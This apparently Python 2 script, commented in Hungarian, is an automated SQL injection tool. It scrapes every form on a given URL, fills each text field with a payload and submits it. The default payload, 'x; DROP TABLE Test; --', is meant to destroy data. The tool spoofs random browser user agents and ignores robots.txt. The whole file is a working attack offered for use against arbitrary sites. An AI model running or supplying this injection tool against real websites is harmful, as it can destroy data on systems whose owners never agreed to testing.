# -*- coding: utf-8 -*-

import mechanize
import random
from bs4 import BeautifulSoup

USER_AGENTS = ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100 101 Firefox/22.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5',
                'Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5')

def sql_injection(url, command="x; DROP TABLE Test; --"):
    
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
    
    forms = []
    i = 0
    
    '''
    Megkeressük a formokat BeautifulSoup segítségével és a hozzájuk tartozó mezöket
    '''
    
    soup = BeautifulSoup(br.open(url).read())
    for form in soup.findAll('form'):
        forms.append([])
        forms[i].append(form['name'])
        for input in form.findAll('input', {'type':'text'}):
            forms[i].append(input['name'])
        i += 1
    
    i = 0
    
    '''
    SQL kód befecskendezése
    '''
    
    for frm in br.forms():
        if str(frm.attrs["name"]) == forms[i][0]:
            br.select_form(nr=i)
            x = 0
            for names in forms[i]:
                if x != 0:
                    br.form[forms[i][x]] = command
                    br.submit()
                x += 1
        br.open(url)     
        i += 1

    return str(len(forms)) + " űrlapba lett befecskendezve a következő lekérés: \"" + command + "\""
if __name__ == '__main__':
    import sys
    url = sys.argv[1]
    from misc import check_if_exists
    if check_if_exists(url):
        print sql_injection(url)
    else:
        print "Hiba az oldal betöltésénél!"
